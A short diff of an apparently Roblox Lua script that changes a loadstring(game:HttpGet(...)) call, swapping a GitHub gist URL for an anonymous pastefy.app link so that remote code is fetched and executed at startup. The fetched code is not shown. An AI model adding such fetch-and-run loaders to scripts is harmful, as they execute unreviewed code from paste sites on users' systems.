@@ -355,7 +355,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://gist.githubusercontent.com/dianalareina33-png/4f69b2c99648deb2743676777cde6ec0/raw/4108f08f708831cade41383397b2f3d1e31572c8/HALOWENN"))()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
 
     task.wait(1)
 
